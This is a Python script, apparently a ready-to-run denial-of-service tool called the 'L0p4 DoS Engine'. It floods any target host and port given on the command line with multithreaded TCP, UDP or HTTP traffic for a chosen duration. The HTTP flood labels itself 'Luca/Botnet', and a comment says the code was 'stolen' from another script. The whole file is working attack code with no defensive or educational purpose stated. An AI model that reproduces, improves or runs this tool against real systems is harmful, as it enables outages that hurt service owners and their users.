import socket
import threading
import time
import argparse
import random
import sys

# --- L0p4 DoS Engine (Real) ---
# "Stolen" and upgraded concept from ddos.py
# Supports: TCP, UDP, HTTP flooding with multi-threading.

keep_going = True

def flood_tcp(target, port):
    while keep_going:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            # Send garbage
            payload = random._urandom(1024)
            s.send(payload)
            s.close()
        except:
            pass

def flood_udp(target, port):
    while keep_going:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(1024)
            s.sendto(payload, (target, port))
        except:
            pass

def flood_http(target, port):
    while keep_going:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            request = f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Luca/Botnet\r\nConnection: keep-alive\r\n\r\n"
            s.send(request.encode('utf-8'))
            s.close()
        except:
            pass

def start_attack(target, port, method, duration, threads):
    global keep_going
    print(f"[*] Starting {method} Attack on {target}:{port}")
    print(f"[*] Duration: {duration}s | Threads: {threads}")

    thread_list = []
    
    target_func = flood_tcp
    if method == "UDP": target_func = flood_udp
    if method == "HTTP": target_func = flood_http

    for i in range(threads):
        t = threading.Thread(target=target_func, args=(target, port))
        t.daemon = True # Kill when main dies
        t.start()
        thread_list.append(t)

    # Timer
    time.sleep(duration)
    keep_going = False
    
    print(f"[+] Attack Finished. {threads} threads stopped.")
    return {"status": "Finished", "details": f"Sent traffic for {duration}s"}

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Real DoS Engine")
    parser.add_argument("target", help="Target IP/Domain")
    parser.add_argument("port", type=int, help="Target Port")
    parser.add_argument("method", help="Method: TCP, UDP, HTTP")
    parser.add_argument("duration", type=int, help="Duration in seconds")
    parser.add_argument("--threads", type=int, default=50, help="Thread count")
    
    args = parser.parse_args()
    
    result = start_attack(args.target, args.port, args.method.upper(), args.duration, args.threads)
